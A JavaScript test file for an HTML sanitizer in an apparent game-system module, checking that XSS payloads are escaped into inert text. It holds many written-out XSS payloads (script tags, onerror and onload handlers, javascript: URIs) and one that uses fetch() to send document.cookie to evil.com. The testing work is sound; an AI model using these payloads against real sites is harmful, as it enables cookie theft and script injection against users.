import { Sanitizer } from '../../src/module/helpers/sanitizer.mjs';

describe('Sanitizer', () => {
  describe('escape', () => {
    it('should escape HTML special characters', () => {
      expect(Sanitizer.escape('<script>alert("XSS")</script>')).toBe(
        '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'
      );
    });

    it('should escape img tag with onerror', () => {
      expect(Sanitizer.escape('<img src=x onerror="alert(1)">')).toBe(
        '&lt;img src=x onerror=&quot;alert(1)&quot;&gt;'
      );
    });

    it('should escape event handlers', () => {
      expect(Sanitizer.escape('<div onclick="malicious()">test</div>')).toBe(
        '&lt;div onclick=&quot;malicious()&quot;&gt;test&lt;/div&gt;'
      );
    });

    it('should escape data URIs', () => {
      expect(Sanitizer.escape('<a href="javascript:alert(1)">Click</a>')).toBe(
        '&lt;a href=&quot;javascript:alert(1)&quot;&gt;Click&lt;/a&gt;'
      );
    });

    it('should escape style tags', () => {
      expect(Sanitizer.escape('<style>body{background:url("javascript:alert(1)")}</style>')).toBe(
        '&lt;style&gt;body{background:url(&quot;javascript:alert(1)&quot;)}&lt;/style&gt;'
      );
    });

    it('should escape iframe tags', () => {
      expect(Sanitizer.escape('<iframe src="evil.com"></iframe>')).toBe(
        '&lt;iframe src=&quot;evil.com&quot;&gt;&lt;/iframe&gt;'
      );
    });

    it('should handle null and undefined', () => {
      expect(Sanitizer.escape(null)).toBe('');
      expect(Sanitizer.escape(undefined)).toBe('');
    });

    it('should convert non-strings to strings', () => {
      expect(Sanitizer.escape(123)).toBe('123');
      expect(Sanitizer.escape(true)).toBe('true');
    });

    it('should handle empty strings', () => {
      expect(Sanitizer.escape('')).toBe('');
    });

    it('should handle legitimate text without modification', () => {
      expect(Sanitizer.escape('John Doe')).toBe('John Doe');
      expect(Sanitizer.escape('Brother Sergeant Marcus')).toBe('Brother Sergeant Marcus');
    });

    it('should escape mixed content', () => {
      const input = 'Name: <b>Evil</b> <script>alert(1)</script>';
      const expected = 'Name: &lt;b&gt;Evil&lt;/b&gt; &lt;script&gt;alert(1)&lt;/script&gt;';
      expect(Sanitizer.escape(input)).toBe(expected);
    });

    it('should escape ampersands', () => {
      expect(Sanitizer.escape('A & B')).toBe('A &amp; B');
    });

    it('should escape single quotes', () => {
      expect(Sanitizer.escape("It's dangerous")).toBe('It&#39;s dangerous');
    });
  });

  describe('html', () => {
    it('should escape interpolated values in tagged template', () => {
      const name = '<script>alert("XSS")</script>';
      const result = Sanitizer.html`<strong>${name}</strong> takes damage`;
      expect(result).toBe('<strong>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</strong> takes damage');
    });

    it('should escape multiple interpolated values', () => {
      const name = '<img src=x onerror="alert(1)">';
      const location = '<script>evil()</script>';
      const result = Sanitizer.html`<strong>${name}</strong> takes damage to ${location}`;
      expect(result).toBe(
        '<strong>&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</strong> takes damage to &lt;script&gt;evil()&lt;/script&gt;'
      );
    });

    it('should handle numeric values', () => {
      const damage = 42;
      const result = Sanitizer.html`Damage: ${damage}`;
      expect(result).toBe('Damage: 42');
    });

    it('should handle undefined values', () => {
      const value = undefined;
      const result = Sanitizer.html`Value: ${value}`;
      expect(result).toBe('Value: ');
    });

    it('should preserve static HTML in template', () => {
      const name = 'Safe Name';
      const result = Sanitizer.html`<div class="test"><strong>${name}</strong></div>`;
      expect(result).toBe('<div class="test"><strong>Safe Name</strong></div>');
    });

    it('should handle complex XSS payload', () => {
      const actorName = '"><img src=x onerror="fetch(\'evil.com?c=\'+document.cookie)">';
      const weaponName = '<svg/onload=alert(1)>';
      const result = Sanitizer.html`[Attack] ${weaponName} by ${actorName}`;
      expect(result).toContain('&lt;');
      expect(result).toContain('&gt;');
      expect(result).toContain('&quot;');
      expect(result).not.toContain('<img');
      expect(result).not.toContain('<svg');
    });

    it('should handle event handler payloads', () => {
      const name = '" onmouseover="alert(1)" x="';
      const result = Sanitizer.html`<button data-name="${name}">Click</button>`;
      // Should escape the quotes, making the event handler inert
      expect(result).toContain('&quot; onmouseover=&quot;');
      expect(result).toContain('&quot;');
    });
  });

  describe('XSS Prevention', () => {
    it('should prevent script injection in actor names', () => {
      const actorName = '<script>document.cookie="pwned"</script>';
      const html = Sanitizer.html`<strong>${actorName}</strong> takes damage`;
      expect(html).not.toContain('<script>');
      expect(html).toContain('&lt;script&gt;');
    });

    it('should prevent img onerror injection', () => {
      const weaponName = '<img src=x onerror="alert(document.cookie)">';
      const html = Sanitizer.html`[Attack] ${weaponName}`;
      // The < and > are escaped, so it won't render as an img tag
      expect(html).toContain('&lt;img');
      expect(html).toContain('&gt;');
      // The event handler is inert because the tag doesn't render
      expect(html).toContain('onerror=&quot;');
    });

    it('should prevent data URI injection', () => {
      const itemName = '<a href="data:text/html,<script>alert(1)</script>">Click</a>';
      const html = Sanitizer.html`<div>${itemName}</div>`;
      expect(html).not.toContain('href="data:');
      expect(html).toContain('&lt;a');
    });

    it('should prevent javascript: protocol injection', () => {
      const name = '<a href="javascript:void(0)">Evil</a>';
      const html = Sanitizer.html`${name} attacks`;
      // The < and > are escaped, so it won't render as a link
      expect(html).toContain('&lt;a');
      expect(html).toContain('&gt;');
      // The javascript: is still present but inert because it's not a real href
      expect(html).toContain('javascript:');
    });

    it('should prevent style-based XSS', () => {
      const name = '<div style="background:url(javascript:alert(1))">Test</div>';
      const html = Sanitizer.html`${name}`;
      expect(html).not.toContain('<div style=');
      expect(html).toContain('&lt;div');
    });

    it('should prevent iframe injection', () => {
      const name = '<iframe src="evil.com"></iframe>';
      const html = Sanitizer.html`${name}`;
      expect(html).not.toContain('<iframe');
      expect(html).toContain('&lt;iframe');
    });

    it('should prevent nested script tags', () => {
      const name = '<scr<script>ipt>alert(1)</scr</script>ipt>';
      const html = Sanitizer.html`${name}`;
      expect(html).not.toContain('<script>');
      expect(html).toContain('&lt;');
    });

    it('should prevent encoded script tags', () => {
      const name = '&#60;script&#62;alert(1)&#60;/script&#62;';
      const html = Sanitizer.html`${name}`;
      // Should escape the encoded entities themselves
      expect(html).toContain('&amp;');
    });
  });

  describe('Real-world scenarios', () => {
    it('should safely render actor name with damage message', () => {
      const actorName = '<img src=x onerror="alert(\'XSS\')">';
      const damage = 10;
      const location = 'Head';
      const html = Sanitizer.html`<strong>${actorName}</strong> takes <strong style="color: red;">${damage} wounds</strong> to ${location}`;

      // The < and > are escaped, preventing the img tag from rendering
      expect(html).toContain('&lt;img');
      expect(html).toContain('&gt;');
      // The onerror is present but escaped/inert
      expect(html).toContain('onerror=&quot;');
      expect(html).toContain('10 wounds');
      expect(html).toContain('to Head');
    });

    it('should safely render weapon attack message', () => {
      const weaponName = '"><script>alert(1)</script><div class="';
      const targetName = '<svg onload=alert(1)>';
      const html = Sanitizer.html`[Attack] ${weaponName} vs ${targetName}`;

      expect(html).not.toContain('<script>');
      expect(html).not.toContain('<svg onload=');
      expect(html).toContain('&quot;&gt;&lt;script&gt;');
    });

    it('should safely render critical damage button', () => {
      const actorId = 'safe-id';
      const location = '<script>alert(1)</script>';
      const damageType = '"><img src=x onerror="alert(1)">';
      const html = Sanitizer.html`<button class="roll-critical-btn" data-actor-id="${actorId}" data-location="${location}" data-damage-type="${damageType}">Roll Critical</button>`;

      // Script tags are escaped
      expect(html).toContain('&lt;script&gt;');
      expect(html).not.toContain('<script>alert');
      // Quotes and tags are escaped in data attributes
      expect(html).toContain('&quot;&gt;&lt;img');
      expect(html).toContain('data-actor-id="safe-id"');
    });
  });
});
